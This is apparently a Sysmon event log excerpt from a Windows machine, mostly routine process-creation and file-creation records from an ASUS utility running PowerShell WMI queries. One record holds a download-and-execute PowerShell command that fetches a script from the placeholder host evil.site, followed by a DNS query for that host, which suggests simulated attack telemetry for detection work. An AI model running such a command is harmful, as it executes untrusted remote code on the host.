+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:13:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:13:33.353
+ProcessGuid: {7f6f9216-5bfd-687d-1d09-000000006901}
+ProcessId: 27320
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_jqfao24o.eaj.ps1
+CreationUtcTime: 2025-07-20 21:13:33.353
+User: SHARON\Shxro"
+"20/07/2025 22:13:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:13:33.278
+ProcessGuid: {7f6f9216-5bfd-687d-1d09-000000006901}
+ProcessId: 27320
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:13:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:13:03.349
+ProcessGuid: {7f6f9216-5bdf-687d-1509-000000006901}
+ProcessId: 15624
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zhtiprcu.f13.ps1
+CreationUtcTime: 2025-07-20 21:13:03.348
+User: SHARON\Shxro"
+"20/07/2025 22:13:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:13:03.275
+ProcessGuid: {7f6f9216-5bdf-687d-1509-000000006901}
+ProcessId: 15624
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:12:42","22","Dns query:
+RuleName: -
+UtcTime: 2025-07-20 21:12:39.194
+ProcessGuid: {7f6f9216-5bc6-687d-1409-000000006901}
+ProcessId: 23576
+QueryName: evil.site
+QueryStatus: 9003
+QueryResults: -
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro"
+"20/07/2025 22:12:38","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:12:38.772
+ProcessGuid: {7f6f9216-5bc6-687d-1409-000000006901}
+ProcessId: 23576
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_lsnz4thz.fks.ps1
+CreationUtcTime: 2025-07-20 21:12:38.772
+User: SHARON\Shxro"
+"20/07/2025 22:12:38","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:12:38.559
+ProcessGuid: {7f6f9216-5bc6-687d-1409-000000006901}
+ProcessId: 23576
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""iex(New-Object Net.WebClient).DownloadString('http://evil.site/script.ps1')""
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
+ParentProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ParentProcessId: 12256
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:12:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:12:33.338
+ProcessGuid: {7f6f9216-5bc1-687d-1209-000000006901}
+ProcessId: 16196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_uw4dlfhk.d4b.ps1
+CreationUtcTime: 2025-07-20 21:12:33.337
+User: SHARON\Shxro"
+"20/07/2025 22:12:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:12:33.264
+ProcessGuid: {7f6f9216-5bc1-687d-1209-000000006901}
+ProcessId: 16196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:12:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:12:03.335
+ProcessGuid: {7f6f9216-5ba3-687d-1009-000000006901}
+ProcessId: 26740
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_j55nlcs0.oqk.ps1
+CreationUtcTime: 2025-07-20 21:12:03.335
+User: SHARON\Shxro"
+"20/07/2025 22:12:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:12:03.260
+ProcessGuid: {7f6f9216-5ba3-687d-1009-000000006901}
+ProcessId: 26740
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:11:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:11:33.327
+ProcessGuid: {7f6f9216-5b85-687d-0b09-000000006901}
+ProcessId: 6712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mse3crtb.3pq.ps1
+CreationUtcTime: 2025-07-20 21:11:33.327
+User: SHARON\Shxro"
+"20/07/2025 22:11:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:11:33.253
+ProcessGuid: {7f6f9216-5b85-687d-0b09-000000006901}
+ProcessId: 6712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:11:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:11:03.321
+ProcessGuid: {7f6f9216-5b67-687d-0909-000000006901}
+ProcessId: 7240
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ghjmllg3.cfq.ps1
+CreationUtcTime: 2025-07-20 21:11:03.321
+User: SHARON\Shxro"
+"20/07/2025 22:11:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:11:03.249
+ProcessGuid: {7f6f9216-5b67-687d-0909-000000006901}
+ProcessId: 7240
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:10:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:10:33.322
+ProcessGuid: {7f6f9216-5b49-687d-0109-000000006901}
+ProcessId: 28132
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_noxqns1f.4f3.ps1
+CreationUtcTime: 2025-07-20 21:10:33.321
+User: SHARON\Shxro"
+"20/07/2025 22:10:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:10:33.248
+ProcessGuid: {7f6f9216-5b49-687d-0109-000000006901}
+ProcessId: 28132
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:10:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:10:03.312
+ProcessGuid: {7f6f9216-5b2b-687d-fe08-000000006901}
+ProcessId: 24364
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_vboua1jc.y5x.ps1
+CreationUtcTime: 2025-07-20 21:10:03.312
+User: SHARON\Shxro"
+"20/07/2025 22:10:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:10:03.237
+ProcessGuid: {7f6f9216-5b2b-687d-fe08-000000006901}
+ProcessId: 24364
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:09:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:09:33.301
+ProcessGuid: {7f6f9216-5b0d-687d-f508-000000006901}
+ProcessId: 25328
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ma3q5ctp.v0u.ps1
+CreationUtcTime: 2025-07-20 21:09:33.301
+User: SHARON\Shxro"
+"20/07/2025 22:09:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:09:33.226
+ProcessGuid: {7f6f9216-5b0d-687d-f508-000000006901}
+ProcessId: 25328
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:09:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:09:03.296
+ProcessGuid: {7f6f9216-5aef-687d-f308-000000006901}
+ProcessId: 9820
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_rwv0ilhr.dru.ps1
+CreationUtcTime: 2025-07-20 21:09:03.295
+User: SHARON\Shxro"
+"20/07/2025 22:09:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:09:03.223
+ProcessGuid: {7f6f9216-5aef-687d-f308-000000006901}
+ProcessId: 9820
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:08:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:08:33.291
+ProcessGuid: {7f6f9216-5ad1-687d-f108-000000006901}
+ProcessId: 27140
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_1gade1or.zx1.ps1
+CreationUtcTime: 2025-07-20 21:08:33.291
+User: SHARON\Shxro"
+"20/07/2025 22:08:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:08:33.217
+ProcessGuid: {7f6f9216-5ad1-687d-f108-000000006901}
+ProcessId: 27140
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:08:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:08:03.288
+ProcessGuid: {7f6f9216-5ab3-687d-ee08-000000006901}
+ProcessId: 436
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wxozi1hq.ye0.ps1
+CreationUtcTime: 2025-07-20 21:08:03.288
+User: SHARON\Shxro"
+"20/07/2025 22:08:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:08:03.214
+ProcessGuid: {7f6f9216-5ab3-687d-ee08-000000006901}
+ProcessId: 436
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:07:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:07:33.276
+ProcessGuid: {7f6f9216-5a95-687d-ec08-000000006901}
+ProcessId: 7860
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_qvyneh1k.wga.ps1
+CreationUtcTime: 2025-07-20 21:07:33.276
+User: SHARON\Shxro"
+"20/07/2025 22:07:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:07:33.202
+ProcessGuid: {7f6f9216-5a95-687d-ec08-000000006901}
+ProcessId: 7860
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:07:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:07:03.263
+ProcessGuid: {7f6f9216-5a77-687d-e808-000000006901}
+ProcessId: 25496
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_kcdpasna.ovq.ps1
+CreationUtcTime: 2025-07-20 21:07:03.263
+User: SHARON\Shxro"
+"20/07/2025 22:07:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:07:03.191
+ProcessGuid: {7f6f9216-5a77-687d-e808-000000006901}
+ProcessId: 25496
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:06:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:06:33.272
+ProcessGuid: {7f6f9216-5a59-687d-e408-000000006901}
+ProcessId: 19832
